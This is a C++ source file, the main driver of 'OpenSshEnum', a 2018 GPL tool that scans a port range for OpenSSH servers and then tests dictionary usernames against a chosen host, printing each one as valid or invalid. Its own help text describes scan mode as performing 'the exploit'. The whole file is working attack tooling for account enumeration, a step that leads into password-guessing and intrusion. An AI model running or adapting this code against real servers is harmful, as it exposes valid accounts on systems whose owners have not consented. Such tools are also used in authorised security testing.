// -----------------------------------------------------------------
// OpenSshEnum - try to enumerate users on a openssh server 
//               using a dictionary.
// Copyright (C) 2018  Gabriele Bonacini
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 3 of the License, or
// (at your option) any later version.
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software Foundation,
// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
// -----------------------------------------------------------------

#include <OpenSshEnum.hpp>
#include <Main.hpp>
#include <config.h> 
#include <parseCmdLine.hpp>

using namespace std;
using namespace opensshenum;
using namespace parCmdLine;
using inet::InetException;
using inet::InetConnectTimeout;

int main(int argc, char **argv){
   const char         *DEFAULT_SSH_PORT     = "22",
                      *DEFAULT_SSH_MIN_PORT = "1",
                      *DEFAULT_SSH_MAX_PORT = "65535";

   const unsigned int MAX_TIMEOUT           = 3600;

   string             usr,
                      port,
                      maxPort,
                      identityFile,
                      host,
                      idString,
                      regexp;

    unsigned int      timeout               = inet::STD_SEC_DELAY;

   #ifndef NOTRACE
   const char         flags[] = "F:snt:m:M:r:c:p:i:hV";
   #else
   const char         flags[] = "F:snt:m:M:r:c:p:i:hdV";
   #endif

   ParseCmdLine pcl(argc, argv, flags);
   if(pcl.getErrorState())
       paramError(argv[0], "Invalid Command Line.");

   #ifndef NOTRACE
      if(pcl.isSet('d'))
          stringutils::setDebug(true);
   #endif

   if(pcl.isSet('V')){
       if(argc != 2) paramError(argv[0], "-V parameter must be present alone.");
       versionInfo();
   }

   if(pcl.isSet('h')){
       if(argc != 2) 
            paramError(argv[0], "-h parameter must be present alone.");
       else 
            paramError(argv[0], nullptr);
   }
   
   if(!pcl.isSet('p') && !pcl.isSet('s'))
      paramError(argv[0], "You must specify -p or -s.");
   
   if(pcl.isSet('p') && pcl.isSet('s'))
      paramError(argv[0], "-s parameter and -p parameter can't be used together.");
   
   if(pcl.isSet('n') && !pcl.isSet('s'))
      paramError(argv[0], "-n parameter requires -s .");
   
   if(pcl.isSet('n') && pcl.isSet('F'))
      paramError(argv[0], "-n parameter is not compatible with -F .");
   
   if(pcl.isSet('t') && !pcl.isSet('s'))
      paramError(argv[0], "-t parameter requires -s .");
   
   if(pcl.isSet('m') && !pcl.isSet('M'))
      paramError(argv[0], "-m parameter requires -M.");
   
   if(!pcl.isSet('m') && pcl.isSet('M') )
      paramError(argv[0], "-M parameter requires -m.");
   
   if(!pcl.isSet('s') && pcl.isSet('r') )
      paramError(argv[0], "-r parameter requires -s.");
   
   if(!pcl.isSet('s') && pcl.isSet('c') )
      paramError(argv[0], "-c parameter requires -s.");

   if(pcl.isSet('t')){
        if(stoi(pcl.getValue('t')) <= 0 )
           paramError(argv[0], "-t parameter's value must be: positive, not zero.");

        if(static_cast<unsigned int>(stoi(pcl.getValue('t'))) > MAX_TIMEOUT)
           paramError(argv[0], 
               string("-t parameter's value must be: less-equal to ").append(to_string(MAX_TIMEOUT)).c_str());
   }

   if(pcl.isSet('p')){
      port    = pcl.getValue('p');
      maxPort = port;
   }else if(pcl.isSet('s')){
      port    = DEFAULT_SSH_MIN_PORT;
      maxPort = DEFAULT_SSH_MAX_PORT;
   }else{
      port    = DEFAULT_SSH_PORT;
      maxPort = port;
   }

   if(pcl.isSet('s')) {
       if(pcl.isSet('m') && pcl.isSet('M') && pcl.isSet('r')){
            port    = pcl.getValue('m');
            maxPort = pcl.getValue('M');
            regexp  = pcl.getValue('r');
       }else{
            paramError(argv[0], "-s parameter requires -m, -M and -r");
       }
   }

   if(pcl.isSet('t'))
      timeout      =  stoi(pcl.getValue('t'));

   if(pcl.isSet('c'))
      idString     =  pcl.getValue('c');

   if(pcl.isSet('i'))
      identityFile = pcl.getValue('i');
   else
      paramError(argv[0], "-i parameter must be present.");

   if(pcl.hasUnflaggedPars())
      host = pcl.getUnflaggedPars();
   else
      paramError(argv[0], "missing honsname or address.");

   try{
      int              currPort  = stoi(port),
                       endPort   = stoi(maxPort) + 1;
      vector<string>   verifiedPorts;

      do{ 
           string        tport           = to_string(currPort),
                         srvIdString;
           try{
               SshConnection ssh(usr,           host,      tport, 
                                 identityFile,  regexp,    idString,
                                 timeout);
               if(ssh.checkPort(srvIdString)){
                  verifiedPorts.push_back(to_string(currPort));
                  cout << currPort << ":VERIFIED:" << srvIdString << endl;
               }else{
                  cout << currPort << ":NOTVERIFIED:" << srvIdString << endl;
               }
           }catch(InetException& ex){
               cout << currPort << ":NO-PORT-ADDR" << endl;
           }catch(InetConnectTimeout& ex){
               cout << currPort << ":TIME-EXCEED" << endl;
           }
           currPort++;
      } while(currPort < endPort);

      if(!pcl.isSet('n') && !pcl.isSet('F') && !verifiedPorts.empty()){
          while( getline(cin, usr) ){
             if(!usr.empty()){
                for(auto it = verifiedPorts.begin(); it != verifiedPorts.end(); ++it){
                    SshConnection ssh(usr, host, *it, identityFile);
                    if(ssh.checkUsr())
                        cout << usr << ":OK" << endl;
                    else
                        cout << usr << ":NOK" << endl;
                }
             }
          }
      }else if(pcl.isSet('F') && !verifiedPorts.empty()){
          SshConnectionFprint::init(pcl.getValue('F'));
          while( getline(cin, usr) ){
             if(!usr.empty()){
                for(auto it = verifiedPorts.begin(); it != verifiedPorts.end(); ++it){
                    SshConnectionFprint::insertUser(usr);
                    SshConnectionFprint ssh(usr, host, *it, identityFile);
                    if(ssh.checkUsr())
                        cout << usr << ":OK" << endl;
                    else
                        cout << usr << ":NOK" << endl;
                }
             }
          }
          SshConnectionFprint::getReport();
      }else{
          cout << "No verified port or -n flag specified in cdm line." << endl;
      }
   } catch(stringutils::StringUtilsException& e){
      cerr << "Exception Rised: " << e.what() << endl;
   } catch(inet::InetException& e){
      cerr << "Exception Rised: " << e.what() << endl;
   } catch(crypto::CryptoException& e){
      cerr << "Exception Rised: " << e.what() << endl;
   } catch(typeutils::TypesUtilsException& e){
      cerr << "Exception Rised: " << e.what() << endl;
   } catch(...){
      cerr << "Unexpected Exception Rised. "  << endl;
   }

   return 0;
}

void paramError(const char* progname, const char* err) noexcept{
   if(err != nullptr)
      cerr << err << endl << endl;
   cerr << "opensshenum - try to enumerate users on a openssh server using a dictionary. GBonacini - (C) 2018   " << endl;
   cerr << "Syntax: " << endl;
   #ifdef NOTRACE
   cerr << "       " << progname << " [-p port | -s -m min -M max -n -r regexp -c clientIdstr] " << endl
        << "       "             << " [-i identity] host"                                        << endl
        << "       "             << " | [-h] | [-V]                                  "           << endl;
   #else
   cerr << "       " << progname << " [-p port | -s -m min -M max -n -r regexp -c clientIdstr] " << endl 
        << "       "             << " [-i identity] [-d] host"                                   << endl 
        << "       "             << " | [-h] | [-V]  "                                           << endl 
        << "       " << "-d enable debug mode."                                                  << endl;
   #endif
   cerr << "       " << "-p specify a singular port to use."                                     << endl 
        << "       " << "-s scan mode try to perform the exploit on a range of port."            << endl 
        << "       " << "   If -m and -M are not specified, the range 1-65535 will be "          << endl 
        << "       " << "   employed."                                                           << endl 
        << "       " << "-n only scan the target to individuate ssh port(s) "                    << endl 
        << "       " << "   No user enumeration is performed."                                   << endl 
        << "       " << "-m lower port for scan mode: the scan will be performed"                << endl 
        << "       " << "   starting from this port number to that specified with -M"            << endl 
        << "       " << "-M higher port for scan mode: the scan will be performed"               << endl 
        << "       " << "   starting from port specified with -m  to this port number."          << endl 
        << "       " << "-i identity file prefix (i.e. id_rsa)."                                 << endl 
        << "       " << "-t port scanning timeout"                                               << endl 
        << "       " << "-r regular expression used in scan mode to identify openssh running"    << endl 
        << "       " << "   on ports other then 22. "                                            << endl 
        << "       " << "-c Client id string used in initial handshaking to identify the ssh"    << endl 
        << "       " << "   client. If no custom string is specified,'SSH-2.0-enum' will be sent"<< endl 
        << "       " << "-h print this help message."                                            << endl 
        << "       " << "-V version information."                                                << endl;
   exit(1);
}

void versionInfo(void) noexcept{
   cerr << PACKAGE << " version: " VERSION << endl;
   exit(1);
}
